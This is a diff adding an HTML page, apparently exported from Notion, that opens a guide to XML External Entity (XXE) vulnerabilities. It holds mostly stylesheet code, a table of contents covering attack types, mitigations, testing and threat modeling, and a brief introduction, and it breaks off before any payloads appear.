@@ -1,0 +1,910 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>XXE (XML External Entity) - Comprehensive Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2d5562ad-76f0-8059-a557-c3710d1c976e" class="page mono"><header><h1 class="page-title" dir="auto">XXE (XML External Entity) - Comprehensive Guide</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2d5562ad-76f0-8094-964c-f5484c355f86" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c0-981c-df616a3fcca6"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8025-bc90-c15ade442d79"><strong>What XXE is Used For</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ac-8bdc-e67a913fed73"><strong>Why XXE is Dangerous</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8009-bc53-d0b946351ff5"><strong>What is XXE</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f0-b038-d4277038ccbd"><strong>Basic Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8003-b0bf-daf66a42b622"><strong>How XXE Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808a-b98b-d27544e0e6ba"><strong>XML Entities</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f2-b86e-d27f9bb4441a"><strong>Attack Flow</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80df-be1c-f34c50930f34"><strong>Types of XXE Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805e-9003-e6fb567a5f7d"><strong>1. File Disclosure (In-Band)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8061-9a8b-f22699d631a0"><strong>2. SSRF (Server-Side Request Forgery)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80af-a458-d697a8d3aad1"><strong>3. Blind XXE (Out-of-Band)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8027-8805-eb24ab566b60"><strong>4. Denial of Service (DoS)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8075-81a9-ed55bf1af1cc"><strong>Impact of XXE</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c7-ac7a-c46987a465cf"><strong>1. Information Disclosure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800b-a18d-c9566e0de1c9"><strong>2. Server-Side Request Forgery (SSRF)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ad-b85e-c15aa5746da2"><strong>3. Denial of Service</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805f-8f55-f5dc91d6bf7b"><strong>4. Remote Code Execution (Rare)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a7-b6d2-c1ea85f92927"><strong>Mitigation Strategies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d2-9e71-fbf6ea3d7375"><strong>1. Disable External Entities (Primary Defense)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8098-8b6b-f401b90e8b27"><strong>2. Use Secure XML Parsers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f8-8b46-c33e5d0d3221"><strong>3. Input Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c9-9dfc-e10095f6670f"><strong>4. Use Simple Data Formats</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-801b-a596-c315a3844660"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e8-b92f-e1910cf7c25f"><strong>1. Always Use Secure Parsers</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8081-8a35-f1a23728ef3e"><strong>2. Disable External Entities Explicitly</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f6-b856-db9999f18ee1"><strong>3. Validate XML Structure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a6-b08d-e770011601ab"><strong>4. Use JSON When Possible</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8004-8bb2-de1896f25244"><strong>Advanced Exploitation Techniques</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d7-9b3d-d8951b17a10c"><strong>1. Parameter Entity Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8060-acfa-e5d72bad01e2"><strong>2. UTF-8 Encoding Bypass</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a0-bec6-f03f6d03c552"><strong>3. XML Schema Attacks</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8000-8a4d-f2b624cd2637"><strong>Penetration Testing Methodology</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ce-8933-d70a384a698e"><strong>XXE Testing Checklist</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80cf-9a4c-d4ddb40a9eae"><strong>Testing Tools</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-808e-935b-cae809028c1f"><strong>Threat Modeling (STRIDE Framework)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ab-aadf-e93a035be606"><strong>Spoofing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800c-89b6-f6f61c3740d8"><strong>Tampering</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a7-8611-f0b0f69e7b61"><strong>Repudiation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8066-be80-c520cb839928"><strong>Information Disclosure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8087-a2ac-c9d450c071e8"><strong>Denial of Service</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8017-9d3a-ffda010088ea"><strong>Elevation of Privilege</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8014-9636-c934f94b982e"><strong>Real-World Case Studies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c8-abf9-e5714466a26d"><strong>Case Study 1: File Disclosure in SOAP Endpoint</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8079-9555-f05678ea1219"><strong>Case Study 2: SSRF via XML Upload</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e0-861d-dbf95fb8771a"><strong>Advanced Mitigations</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80af-a6f8-fe7669e5e42f"><strong>Defense in Depth Strategy</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8012-80a8-e31de03964e1"><strong>SAST/DAST Detection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8077-aa89-e0628c4895d4"><strong>SAST (Static Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a7-a2cc-e21e7b58640f"><strong>DAST (Dynamic Application Security Testing)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-806c-b287-c7bc4dd134b9"><strong>Risk Assessment</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-806a-af1e-f207d1bbb10d"><strong>Risk Matrix</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8056-b6f2-cd3f1b15882c"><strong>Risk Calculation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f8-a2da-de45c4c9661f"><strong>Summary</strong></a></div></nav></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80c0-981c-df616a3fcca6" class=""><strong>Introduction</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f3-bca8-f37b5040839e" class="">XXE (XML External Entity) is a vulnerability that allows attackers to exploit XML parsers by including external entities, leading to information disclosure, SSRF attacks, or denial of service. It ranks #4 in OWASP Top 10 2017.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8025-bc90-c15ade442d79" class=""><strong>What XXE is Used For</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e1-8769-d931ae5c92a6" class="">Attackers use XXE to:</p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802f-96cb-f50c935d07dd" class="bulleted-list"><li style="list-style-type:disc"><strong>Read local files</strong> from the server filesystem</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e1-ac75-d28e75070e9f" class="bulleted-list"><li style="list-style-type:disc"><strong>Perform SSRF attacks</strong> by making HTTP requests from the server</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8080-93b6-dd5bb10f6958" class="bulleted-list"><li style="list-style-type:disc"><strong>Cause denial of service</strong> through entity expansion attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8020-b2b0-d6edad926468" class="bulleted-list"><li style="list-style-type:disc"><strong>Extract sensitive data</strong> from configuration files</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8037-ba88-e901facec9e3" class="bulleted-list"><li style="list-style-type:disc"><strong>Access internal network resources</strong> via SSRF</li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ac-8bdc-e67a913fed73" class=""><strong>Why XXE is Dangerous</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8024-86b7-d0ad3aae017d" class=""><strong>Severity:</strong></p></div><div style="display:contents" dir="auto"><ul 